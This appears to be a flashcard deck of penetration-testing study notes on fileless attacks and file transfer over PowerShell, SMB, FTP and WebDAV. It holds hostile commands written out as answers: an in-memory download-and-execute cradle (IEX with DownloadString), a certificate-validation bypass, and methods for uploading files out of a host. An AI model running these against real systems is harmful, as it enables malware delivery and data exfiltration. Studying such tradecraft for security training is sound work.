What is a fileless attack? | A threat that doesn't come in a file but uses legitimate tools built into a system to execute an attack, running in memory rather than being present on disk

What tools were used in the Astaroth attack chain? | LNK file → WMIC tool with /Format parameter → JavaScript code → Bitsadmin tool → Certutil tool → regsvr32 tool

What is the maximum string length for Windows Command Line utility (cmd.exe)? | 8,191 characters

What PowerShell command encodes a file to base64? | [Convert]::ToBase64String((Get-Content -path "filename" -Encoding byte))

What PowerShell command decodes a base64 string to a file? | [IO.File]::WriteAllBytes("C:\path\file", [Convert]::FromBase64String("base64string"))

What PowerShell command downloads a file using WebClient? | (New-Object Net.WebClient).DownloadFile('URL','OutputFile')

What PowerShell method downloads and executes a script directly in memory? | IEX (New-Object Net.WebClient).DownloadString('URL')

What parameter bypasses Internet Explorer first-launch configuration issues? | -UseBasicParsing

What command bypasses SSL/TLS certificate trust issues in PowerShell? | [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

What ports does SMB protocol use? | TCP/445 (and TCP/139 for older versions)

What command creates an SMB server with Impacket? | sudo impacket-smbserver share -smb2support /tmp/smbshare

How do you create an SMB server with authentication? | sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

What command mounts an SMB share in Windows? | net use n: \\IP\share /user:username password

What ports does FTP use? | TCP/21 (control) and TCP/20 (data)

What Python module can be used to create an FTP server? | pyftpdlib

What command starts a Python FTP server on port 21? | sudo python3 -m pyftpdlib --port 21

What PowerShell command downloads a file from FTP? | (New-Object Net.WebClient).DownloadFile('ftp://IP/file.txt', 'C:\path\file.txt')

What Python module provides a web server with upload functionality? | uploadserver

What command starts the uploadserver? | python3 -m uploadserver

What PowerShell command uploads a file via FTP? | (New-Object Net.WebClient).UploadFile('ftp://IP/filename', 'C:\path\file')

What is WebDAV? | An extension of HTTP that enables a webserver to behave like a fileserver, supporting collaborative content authoring

What Python modules are needed for WebDAV server? | wsgidav and cheroot

What command starts a WebDAV server? | sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

What is the special keyword for connecting to WebDAV root? | DavWWWRoot

What command copies a file to a WebDAV share? | copy C:\file \\IP\DavWWWRoot\

What parameter allows FTP clients to upload files to pyftpdlib server? | --write

What PowerShell cmdlet can be used instead of WebClient for downloads? | Invoke-WebRequest (aliases: iwr, curl, wget)

What parameter specifies the output file for Invoke-WebRequest? | -OutFile

What command checks MD5 hash in PowerShell? | Get-FileHash filename -Algorithm md5

What Linux command decodes base64? | base64 -d

What command creates FTP commands file for batch upload? | echo commands > ftpcommand.txt, then ftp -v -n -s:ftpcommand.txt

What method uploads files using PowerShell and base64 encoding? | Convert file to base64, then use Invoke-WebRequest with -Method POST -Body $b64

What SMB restrictions do companies typically implement? | Block SMB protocol (TCP/445) from leaving internal network to prevent lateral movement attacks

How does SMB over HTTP work? | SMB first attempts SMB protocol, if unavailable it falls back to HTTP using WebDAV

What is the alternative to SMB for file transfers in restricted networks? | WebDAV (Web Distributed Authoring and Versioning) over HTTP/HTTPS
